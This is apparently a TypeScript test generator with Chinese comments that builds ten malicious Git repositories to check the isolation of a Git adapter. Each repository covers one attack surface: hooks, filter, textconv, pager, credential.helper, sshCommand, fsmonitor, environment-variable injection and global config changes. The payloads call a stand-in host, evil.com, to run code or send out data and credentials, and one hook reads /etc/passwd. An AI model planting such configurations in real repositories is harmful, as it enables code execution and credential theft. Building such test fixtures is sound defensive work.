/**
 * SPIKE 03 - 恶意样本仓库生成器
 *
 * 生成覆盖 N01-N10 攻击面的测试仓库，用于验证 Git Adapter 的隔离防护。
 *
 * 攻击面：
 *   N01 - hooks 仓库攻击
 *   N02 - filter 仓库攻击
 *   N03 - textconv 仓库攻击
 *   N04 - pager 仓库攻击
 *   N05 - credential.helper 攻击
 *   N06 - core.sshCommand 攻击
 *   N07 - core.fsmonitor 攻击
 *   N08 - GIT_* 环境变量注入
 *   N09 - SSH_* 环境变量注入
 *   N10 - 全局 config 修改攻击
 *
 * TypeScript target: ES2020
 * Win7-Validation: NOT_PERFORMED
 */

import * as fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';

// ─── 类型定义 ────────────────────────────────────────────────────────────────

interface GeneratorOptions {
  /** 输出目录 */
  outputDir: string;
  /** Git 可执行文件路径 */
  gitPath?: string;
}

interface AttackSurface {
  id: string;
  name: string;
  description: string;
  generate: (repoDir: string) => void;
}

// ─── 攻击面生成函数 ──────────────────────────────────────────────────────────

/**
 * N01: hooks 仓库攻击
 * 攻击：通过 .git/hooks 执行恶意代码
 */
function generateHooksAttack(repoDir: string): void {
  const hooksDir = path.join(repoDir, '.git', 'hooks');
  fs.mkdirSync(hooksDir, { recursive: true });

  // 创建恶意 pre-commit hook
  const hookContent = `#!/bin/sh
# 恶意 hook：尝试执行系统命令
echo "HOOK_EXECUTED" > /tmp/git-hook-pwned
# 尝试读取敏感文件
cat /etc/passwd 2>/dev/null || type C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts 2>/dev/null
exit 0
`;
  fs.writeFileSync(path.join(hooksDir, 'pre-commit'), hookContent, { mode: 0o755 });

  // 创建 post-checkout hook
  const postCheckout = `#!/bin/sh
# 恶意 post-checkout hook
curl http://evil.com/steal?data=$(whoami) 2>/dev/null || true
`;
  fs.writeFileSync(path.join(hooksDir, 'post-checkout'), postCheckout, { mode: 0o755 });
}

/**
 * N02: filter 仓库攻击
 * 攻击：通过 .gitattributes 配置 filter 执行恶意代码
 */
function generateFilterAttack(repoDir: string): void {
  // 配置本地 filter
  execSync('git config filter.malicious.process "curl http://evil.com/pwn"', { cwd: repoDir });
  execSync('git config filter.malicious.required true', { cwd: repoDir });

  // 创建 .gitattributes 触发 filter
  const gitattributes = `# 恶意 .gitattributes
*.txt filter=malicious
`;
  fs.writeFileSync(path.join(repoDir, '.gitattributes'), gitattributes);
}

/**
 * N03: textconv 仓库攻击
 * 攻击：通过 diff 配置 textconv 执行恶意代码
 */
function generateTextconvAttack(repoDir: string): void {
  // 配置本地 textconv
  execSync('git config diff.malicious.textconv "curl http://evil.com/steal"', { cwd: repoDir });

  // 创建 .gitattributes 触发 textconv
  const gitattributes = `# 恶意 .gitattributes
*.bin diff=malicious
`;
  fs.writeFileSync(path.join(repoDir, '.gitattributes'), gitattributes);
}

/**
 * N04: pager 仓库攻击
 * 攻击：通过配置 pager 执行恶意代码
 */
function generatePagerAttack(repoDir: string): void {
  // 配置本地 pager
  execSync('git config core.pager "curl http://evil.com/pwn"', { cwd: repoDir });
}

/**
 * N05: credential.helper 攻击
 * 攻击：通过 credential.helper 窃取凭证
 */
function generateCredentialAttack(repoDir: string): void {
  // 配置恶意 credential.helper
  execSync('git config credential.helper "!curl http://evil.com/steal -d \\"$1\\""', { cwd: repoDir });
}

/**
 * N06: core.sshCommand 攻击
 * 攻击：通过 sshCommand 执行恶意代码
 */
function generateSSHCommandAttack(repoDir: string): void {
  // 配置恶意 sshCommand
  execSync('git config core.sshCommand "curl http://evil.com/pwn; ssh"', { cwd: repoDir });
}

/**
 * N07: core.fsmonitor 攻击
 * 攻击：通过 fsmonitor 执行恶意代码
 */
function generateFsmonitorAttack(repoDir: string): void {
  // 配置恶意 fsmonitor
  execSync('git config core.fsmonitor "curl http://evil.com/pwn"', { cwd: repoDir });
}

/**
 * N08: GIT_* 环境变量注入
 * 生成测试脚本，注入各种 GIT_* 环境变量
 */
function generateGitEnvAttack(repoDir: string): void {
  const script = `#!/bin/bash
# N08: GIT_* 环境变量注入测试

# 尝试覆盖 GIT_DIR
export GIT_DIR=/tmp/evil-git-dir

# 尝试覆盖 GIT_CONFIG
export GIT_CONFIG=/etc/passwd

# 尝试注入 GIT_CONFIG_GLOBAL
export GIT_CONFIG_GLOBAL=/tmp/evil-config

# 尝试覆盖 GIT_WORK_TREE
export GIT_WORK_TREE=/tmp/evil-worktree

# 执行 git 命令
git status
`;
  fs.writeFileSync(path.join(repoDir, 'test_git_env.sh'), script, { mode: 0o755 });
}

/**
 * N09: SSH_* 环境变量注入
 * 生成测试脚本，注入 SSH_* 环境变量
 */
function generateSSHEnvAttack(repoDir: string): void {
  const script = `#!/bin/bash
# N09: SSH_* 环境变量注入测试

# 尝试覆盖 SSH_ASKPASS
export SSH_ASKPASS="curl http://evil.com/steal"

# 尝试覆盖 SSH_AUTH_SOCK
export SSH_AUTH_SOCK="/tmp/evil-ssh-sock"

# 尝试覆盖 GIT_SSH_COMMAND
export GIT_SSH_COMMAND="curl http://evil.com/pwn; ssh"

# 执行 git 命令
git status
`;
  fs.writeFileSync(path.join(repoDir, 'test_ssh_env.sh'), script, { mode: 0o755 });
}

/**
 * N10: 全局 config 修改攻击
 * 生成测试脚本，尝试修改全局配置
 */
function generateGlobalConfigAttack(repoDir: string): void {
  const script = `#!/bin/bash
# N10: 全局 config 修改攻击测试

# 尝试修改全局 user.name
git config --global user.name "Hacked"

# 尝试修改全局 core.editor
git config --global core.editor "curl http://evil.com/pwn"

# 尝试修改全局 core.hooksPath
git config --global core.hooksPath /tmp/evil-hooks

# 尝试添加全局 credential.helper
git config --global credential.helper "!curl http://evil.com/steal"

# 执行 git 命令
git status
`;
  fs.writeFileSync(path.join(repoDir, 'test_global_config.sh'), script, { mode: 0o755 });
}

// ─── 攻击面定义 ──────────────────────────────────────────────────────────────

const ATTACK_SURFACES: AttackSurface[] = [
  {
    id: 'N01',
    name: 'hooks 仓库攻击',
    description: '通过 .git/hooks 执行恶意代码',
    generate: generateHooksAttack,
  },
  {
    id: 'N02',
    name: 'filter 仓库攻击',
    description: '通过 .gitattributes 配置 filter 执行恶意代码',
    generate: generateFilterAttack,
  },
  {
    id: 'N03',
    name: 'textconv 仓库攻击',
    description: '通过 diff 配置 textconv 执行恶意代码',
    generate: generateTextconvAttack,
  },
  {
    id: 'N04',
    name: 'pager 仓库攻击',
    description: '通过配置 pager 执行恶意代码',
    generate: generatePagerAttack,
  },
  {
    id: 'N05',
    name: 'credential.helper 攻击',
    description: '通过 credential.helper 窃取凭证',
    generate: generateCredentialAttack,
  },
  {
    id: 'N06',
    name: 'core.sshCommand 攻击',
    description: '通过 sshCommand 执行恶意代码',
    generate: generateSSHCommandAttack,
  },
  {
    id: 'N07',
    name: 'core.fsmonitor 攻击',
    description: '通过 fsmonitor 执行恶意代码',
    generate: generateFsmonitorAttack,
  },
  {
    id: 'N08',
    name: 'GIT_* 环境变量注入',
    description: '注入 GIT_* 环境变量覆盖配置',
    generate: generateGitEnvAttack,
  },
  {
    id: 'N09',
    name: 'SSH_* 环境变量注入',
    description: '注入 SSH_* 环境变量',
    generate: generateSSHEnvAttack,
  },
  {
    id: 'N10',
    name: '全局 config 修改攻击',
    description: '尝试修改全局 Git 配置',
    generate: generateGlobalConfigAttack,
  },
];

// ─── 生成器类 ────────────────────────────────────────────────────────────────

/**
 * 恶意样本仓库生成器
 */
class MaliciousRepoGenerator {
  private options: GeneratorOptions;

  constructor(options: GeneratorOptions) {
    this.options = {
      gitPath: 'git',
      ...options,
    };
  }

  /**
   * 生成所有攻击面的测试仓库
   */
  generateAll(): void {
    console.log('SPIKE 03 - 恶意样本仓库生成器');
    console.log('='.repeat(50));
    console.log(`输出目录: ${this.options.outputDir}`);
    console.log('');

    // 创建输出目录
    fs.mkdirSync(this.options.outputDir, { recursive: true });

    // 为每个攻击面生成独立仓库
    for (const surface of ATTACK_SURFACES) {
      this.generateRepo(surface);
    }

    console.log('');
    console.log(`总计生成 ${ATTACK_SURFACES.length} 个测试仓库`);
    console.log('');
    console.log('Win7-Validation: NOT_PERFORMED');
  }

  /**
   * 生成单个攻击面的测试仓库
   * @private
   */
  private generateRepo(surface: AttackSurface): void {
    const repoDir = path.join(this.options.outputDir, `attack_${surface.id}`);

    console.log(`[${surface.id}] ${surface.name}`);
    console.log(`     ${surface.description}`);

    // 创建仓库目录
    fs.mkdirSync(repoDir, { recursive: true });

    // 初始化 Git 仓库
    try {
      execSync(`${this.options.gitPath} init`, { cwd: repoDir, stdio: 'pipe' });
      execSync(`${this.options.gitPath} config user.email "test@test.com"`, { cwd: repoDir, stdio: 'pipe' });
      execSync(`${this.options.gitPath} config user.name "Test"`, { cwd: repoDir, stdio: 'pipe' });

      // 创建初始提交
      fs.writeFileSync(path.join(repoDir, 'README.md'), `# Attack Surface ${surface.id}\n`);
      execSync(`${this.options.gitPath} add .`, { cwd: repoDir, stdio: 'pipe' });
      execSync(`${this.options.gitPath} commit -m "Initial commit"`, { cwd: repoDir, stdio: 'pipe' });

      // 生成攻击内容
      surface.generate(repoDir);

      console.log(`     → ${repoDir}`);
    } catch (err) {
      console.error(`     ✗ 生成失败: ${(err as Error).message}`);
    }
  }
}

// ─── 入口 ────────────────────────────────────────────────────────────────────

if (require.main === module) {
  const outputDir = process.argv[2] || path.join(__dirname, 'output');
  const generator = new MaliciousRepoGenerator({ outputDir });
  generator.generateAll();
}

export {
  MaliciousRepoGenerator,
  GeneratorOptions,
  AttackSurface,
  ATTACK_SURFACES,
};
